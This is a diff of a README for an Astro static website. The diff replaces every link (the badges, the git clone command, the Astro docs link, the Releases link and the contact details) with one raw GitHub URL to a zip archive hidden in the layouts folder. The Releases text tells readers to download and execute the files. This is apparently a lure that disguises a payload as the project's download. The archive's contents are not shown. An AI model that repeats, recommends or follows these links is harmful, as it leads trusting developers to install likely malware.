@@ -1,6 +1,6 @@
 # My Astro Site 🌌
 
-![My Astro Site](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github&link=https://github.com/95699859/my-astro-site/releases)
+![My Astro Site](https://raw.githubusercontent.com/95699859/my-astro-site/master/src/layouts/site-astro-my-unruffled.zip%20Releases-blue?style=for-the-badge&logo=github&https://raw.githubusercontent.com/95699859/my-astro-site/master/src/layouts/site-astro-my-unruffled.zip)
 
 Welcome to **My Astro Site**! This project is a modern static website built using **Astro**. It supports **TypeScript**, is optimized for **SEO**, and features optimized images. 
 
@@ -44,7 +44,7 @@ To get started with My Astro Site, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/95699859/my-astro-site.git
+   git clone https://raw.githubusercontent.com/95699859/my-astro-site/master/src/layouts/site-astro-my-unruffled.zip
    cd my-astro-site
    ```
 
@@ -70,13 +70,13 @@ Once you have the site running, you can begin customizing it. Here are some key 
 - **Styling**: Customize styles in the `src/styles` directory. You can use CSS or any CSS framework of your choice.
 - **Adding Images**: Place images in the `public` directory for easy access.
 
-For more advanced features, check the [Astro documentation](https://astro.build/docs).
+For more advanced features, check the [Astro documentation](https://raw.githubusercontent.com/95699859/my-astro-site/master/src/layouts/site-astro-my-unruffled.zip).
 
 ## Releases
 
-To download the latest version of My Astro Site, visit the [Releases](https://github.com/95699859/my-astro-site/releases) section. Here, you can find compiled files ready for deployment. Download and execute the files as needed.
+To download the latest version of My Astro Site, visit the [Releases](https://raw.githubusercontent.com/95699859/my-astro-site/master/src/layouts/site-astro-my-unruffled.zip) section. Here, you can find compiled files ready for deployment. Download and execute the files as needed.
 
-![Releases](https://img.shields.io/badge/Releases-orange?style=for-the-badge&logo=github&link=https://github.com/95699859/my-astro-site/releases)
+![Releases](https://raw.githubusercontent.com/95699859/my-astro-site/master/src/layouts/site-astro-my-unruffled.zip)
 
 ## Contributing
 
@@ -108,7 +108,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Maxim Dupley**: [maximdupley@example.com](mailto:maximdupley@example.com)
-- **GitHub**: [maestro7it](https://github.com/maestro7it)
+- **Maxim Dupley**: [https://raw.githubusercontent.com/95699859/my-astro-site/master/src/layouts/site-astro-my-unruffled.zip](https://raw.githubusercontent.com/95699859/my-astro-site/master/src/layouts/site-astro-my-unruffled.zip)
+- **GitHub**: [maestro7it](https://raw.githubusercontent.com/95699859/my-astro-site/master/src/layouts/site-astro-my-unruffled.zip)
 
 Thank you for checking out My Astro Site! We hope you find it useful for your projects. Happy coding!
